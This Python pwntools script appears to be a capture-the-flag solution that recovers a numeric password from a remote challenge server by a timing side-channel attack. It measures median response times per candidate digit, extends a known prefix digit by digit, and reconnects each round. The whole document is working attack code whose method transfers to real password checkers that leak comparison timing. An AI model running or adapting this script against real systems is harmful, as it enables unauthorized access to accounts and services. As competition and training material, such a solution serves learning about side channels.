#!/usr/bin/env python3
"""Timing side-channel attack on password checker - with reconnection."""

from pwn import *
import time
import statistics

context.log_level = 'info'

HOST = 'chals3.apoorvctf.xyz'
PORT = 9001

def try_password(r, password):
    """Send password and measure response time."""
    r.recvuntil(b'password: ')
    start = time.time()
    r.sendline(password.encode())
    resp = r.recvline()
    elapsed = time.time() - start
    return elapsed, resp

def find_password():
    password = "9347801"  # known from prior runs
    max_len = 20
    rounds = 3  # minimal rounds, signal is very clear

    for pos in range(len(password), max_len):
        digit_times = {str(d): [] for d in range(10)}

        for round_num in range(rounds):
            # Reconnect each round to avoid server timeout
            r = remote(HOST, PORT)
            try:
                for d in range(10):
                    guess = password + str(d)
                    t, resp = try_password(r, guess)

                    if b'Incorrect' not in resp:
                        log.success(f"Password found: {guess}")
                        log.success(f"Response: {resp.decode().strip()}")
                        try:
                            remaining = r.recvall(timeout=3)
                            log.success(f"Remaining: {remaining.decode().strip()}")
                        except:
                            pass
                        r.close()
                        return guess

                    digit_times[str(d)].append(t)
            except EOFError:
                log.warning(f"Connection lost in round {round_num}, reconnecting...")
            finally:
                r.close()

        times = {}
        for d in range(10):
            if digit_times[str(d)]:
                median_t = statistics.median(digit_times[str(d)])
                times[str(d)] = median_t

        if not times:
            log.error("No timing data collected!")
            break

        best_digit = max(times, key=times.get)
        second_best = sorted(times.values())[-2]
        margin = times[best_digit] - second_best

        password += best_digit
        log.success(f"Position {pos}: digit={best_digit} time={times[best_digit]:.5f}s margin={margin:.5f}s")
        log.success(f"Password so far: {password}")

        if margin < 0.05:
            log.warning(f"Small margin — might be end of password")
            # Try exact password
            r = remote(HOST, PORT)
            for test_pw in [password[:-1], password]:
                t, resp = try_password(r, test_pw)
                if b'Incorrect' not in resp:
                    log.success(f"Password: {test_pw}")
                    log.success(f"Response: {resp.decode().strip()}")
                    try:
                        remaining = r.recvall(timeout=3)
                        log.success(f"Remaining: {remaining.decode().strip()}")
                    except:
                        pass
                    r.close()
                    return test_pw
            r.close()

    return password

if __name__ == '__main__':
    pw = find_password()
    print(f"\nFinal password: {pw}")
